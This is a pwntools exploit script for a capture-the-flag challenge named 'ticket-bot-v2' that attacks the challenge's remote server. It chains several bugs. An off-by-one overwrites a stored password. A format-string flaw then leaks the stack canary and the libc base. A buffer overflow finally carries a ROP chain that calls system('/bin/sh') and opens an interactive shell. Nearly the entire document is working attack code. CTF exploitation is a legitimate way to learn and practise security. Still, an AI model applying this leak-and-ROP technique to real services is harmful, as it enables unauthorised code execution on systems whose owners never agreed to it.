from pwn import *
import pwn
import random as rnd
import struct as st
from time import sleep
import re
import subprocess

context.arch = "amd64"
context.word_size = 64
context.bits = 64
context.os = "linux"

file = "./chal"
exe_args = []
io: process = None
PREFIX = b"========================\n"

speed = 0.2

def debug():
    gdb.attach(io, gdbscript=
    """
    hb *0x00000000004011d9
    """)
    input("debug")

def launch_remote():
    global file, io
    io = remote("ticket-bot-v2.challs.csc.tf", 1337)

def launch_local():
    global file, io
    io = process([file, *exe_args])
    if args.GDB:
        debug()

def solve_pow():
    leak = recvu(b"===================")
    pow = getb(leak, b") solve ", b"\n").decode()
    proc = subprocess.Popen(["solvepow", "solve", pow], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
    pow = proc.communicate()[0]
    sla(b"Solution? ", pow)

u64 = lambda d: pwn.u64(d.ljust(8, b"\0")[:8])
u32 = lambda d: pwn.u32(d.ljust(4, b"\0")[:4])
u16 = lambda d: pwn.u16(d.ljust(2, b"\0")[:2])
sla = lambda a, b: io.sendlineafter(a, b)
sa = lambda a, b: io.sendafter(a, b)
sl = lambda a: io.sendline(a)
recv = lambda: io.recv()
recvn = lambda a: io.recvn(a)
recvu = lambda a, b=False: io.recvuntil(a, b)
safe_link = lambda addr, ptr: (addr >> 12) ^ ptr
binsh = lambda: next(libc.search(b"/bin/sh\0"))
snum = lambda a, b: sla(a, str(b).encode("iso-8859-1"))
sprefix = lambda a: sla(PREFIX, a)
choice = lambda a: snum(PREFIX, a)

def launch():
    if args.REMOTE:
        l = launch_remote
    else:
        l = launch_local
    with context.local(log_level=logging.ERROR):
        l()
    if args.POW:
        solve_pow()

def getb(d, a, b):
    a_ = d.find(a)
    if a_ == -1 or a == b"": a_ = 0
    b_ = d.find(b, a_+len(a))
    if b_ == -1 or b == b"": b_ = len(d)
    return d[a_+len(a):b_]

# ================================================================
# EXPLOIT HERE
# ================================================================

with context.local(log_level=logging.ERROR):
    exe = ELF(file)
    libc = ELF("./libc.so.6")

tries = 0
# tries_prog = log.progress("Tries")
def exploit():
    def ticket(reason):
        choice(1)
        sla(b"your here:\n", reason)
    def login(password):
        choice(3)
        snum(b"Password\n", password)
    def change_password(password, should_recv=True):
        choice(1)
        sla(b"Password\n", password)
        if not should_recv:
            return
        return getb(recvu(b"========================\n1"), b"Password changed to\n", b"====")

    sla(b"your here:\n", b"a")
    for _ in range(4):
        ticket(b"a")
    
    ticket(b"A"*0x20) # use off by one to overwrite secret password with AAAAAA

    def vuln(payload, should_recv=True):
        login(u32(b"AAAA"))
        return change_password(payload, should_recv) # vuln is a scanf(%s) (bof) and a printf

    # first use the format string vuln to leak stuff
    # then use the bof to get a shell

    canary = int(vuln(b"%7$p"), 16) 
    # exe.address = int(vuln(b"%9$p"), 16) - 0x16a6 # no need to leak exe because libc already contains gadgets
    libc.address = int(vuln(b"%p"), 16) - 0x1ed723
    # success("exe: %#018x" % exe.address)
    success("canary: %#018x" % canary)
    success("libc: %#018x" % libc.address)

    pop_rdi = libc.address + 0x0000000000023b6a
    ret = libc.address + 0x0000000000022679
    payload = flat([
        b"A"*8,
        canary,
        0,

        pop_rdi,
        binsh(),
        ret,
        libc.sym.system,
    ])
    vuln(payload, False)

    io.interactive()
    input("end")
    exit()

launch()
exploit()
exit()

while True:
    count = 0
    tries += 1
    tries_prog.status(str(tries))

    launch()
    try:
        exploit()
    except EOFError:
        pass

    with context.local(log_level=logging.ERROR):
        io.close()
    # sleep(0.05)